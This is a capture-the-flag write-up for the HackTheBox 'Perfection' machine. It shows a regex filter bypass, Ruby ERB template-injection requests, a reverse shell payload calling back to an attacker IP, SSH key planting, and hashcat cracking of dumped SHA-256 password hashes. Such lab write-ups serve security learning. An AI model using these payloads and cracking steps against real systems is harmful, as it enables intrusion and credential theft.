HTB Machine

First, an `nmap` of the box after setting up the `/etc/hosts` to set up dns for the hostname.
```
Nmap scan report for perfection.htb (10.129.209.140)
Host is up (0.018s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Well, clean and clear, ssh is probably nothing, so its only http. boot up burpsuite, redirect traffic in the webbrowser to burp, and visit the site.

Most of it seems boiler plate and non-interactive, however there is a page called "calculate your weighted grade"

Seems like there is input on this page, but if we scroll all the way down, it says "Powered by WEBrick 1.7.0". [Webrick](https://github.com/ruby/webrick) is a ruby http server, which means that any input we give it should be based on ruby.

googling "hacktricks ruby" immediately takes us to the [SSTI page for ruby](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby) Lets try some of them. However, there seems to be some sort of filtering that gives 
`Malicious input blocked` if it finds some sort of filtering. Behind the scenes, its doing this filtering
```ruby
...
elsif params[:category1] =~ /^[a-zA-Z0-9\/ ]+$/ ...

@result = ERB.new("Your total grade is ...

erb :'weighted_grade_results'

else

@result = "Malicious input blocked"

erb :'weighted_grade_results'

end
```

In order to bypass the filtering, we can try a trick for regex. If we add in a whitespace character, and then a new line `%0a`, we can bypass the filtering.

so, implementing this bypass, which looks like `+%0a` in the request, we can implement an SSTI in the above link, and execute whatever commands we like.

```
POST /weighted-grade-calc HTTP/1.1
Host: perfection.htb
...
category1=%20%0a<%25%3d+`whoami`+%25>&grade1=100&weight1=100&category2=N%2FA&grade2=0&weight2=0&category3=N%2FA&grade3=0&weight3=0&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0
```

```
...
</form>
      Your total grade is 100%<p> 
	susan
: 100%</p>
```

lets use [revshells.com](revshells.com) with the insight that our server is running ruby to execute a reverse shell. 

`<= spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.200",3001))%>`

Gets us a shell!

Next is to establish a proper shell. which is easily done with these two lines
`mkdir /home/susan/.ssh`
`echo "[your id_*.pub key]" > /home/susan/.ssh/authorized_keys`

And if you try to ssh in through your regular terminal...
```bash
$ ssh susan@perfection.htb      
...
You have mail.
susan@perfection:~$
```

We are in! Be sure to read `user.txt` and submit it to get credit.

we see mail as a notification, so lets check /var/mail. There is a file there, with this message.

```
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```

and if we check `~/Migration/` we can see the file `pupilpath_credentials.db`. running `binwalk` on the file gets us

```
$ binwalk pupilpath_credentials.db  

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             SQLite 3.x database,
```

if we use the `sqlite` command, and do a first guess of `users` as the table, we can make a query to get all of the data from the database.
```
$ sqlite3 pupilpath_credentials.db
SQLite version 3.44.2 2023-11-24 11:41:44
Enter ".help" for usage hints.
sqlite> .headers ON
sqlite> select * from users;
id|name|password
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
sqlite>
```

The hash in the password is identifiable with `hash-identifier`
```
$ hash-identifier abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] SHA-256
[+] Haval-256

Least Possible Hashs:
[+] GOST R 34.11-94
[+] RipeMD-256
[+] SNEFRU-256
[+] SHA-256(HMAC)
[+] Haval-256(HMAC)
[+] RipeMD-256(HMAC)
[+] SNEFRU-256(HMAC)
[+] SHA-256(md5($pass))
[+] SHA-256(sha1($pass))
--------------------------------------------------
```

Most likely, its `SHA-256`.

So, we know that the the password format should be ` {firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}`

so for each one, we can use `hashcat`. We can reference their [example hashes site](https://hashcat.net/wiki/doku.php?id=example_hashes) , and the mode we need to use is `1400`. Next, our brute forcing method. we know it starts with something like `susan_nasus_`.  theres also the option of `--increment` which allows `hashcat` to iterate through the mask below, one character at a time. so we start it with the susan hash

`hashcat -m 1400 -a 3 --increment --increment-min 12 --increment-max 22 hash.txt susan_nasus_?d?d?d?d?d?d?d?d?d?d`

And its been cracked. Lets try it with the others!
`tina_anit_:dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57`
`david_divad_:ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a`
`harry_yrrah_:d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393`
`stephen_nehpets_:154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8`

And if you check your potfile, you should be able to find all of the passwords in there.

lets try a simple `sudo su` to get to root. And it works, box rooted!
https://www.hackthebox.com/achievement/machine/158887/590

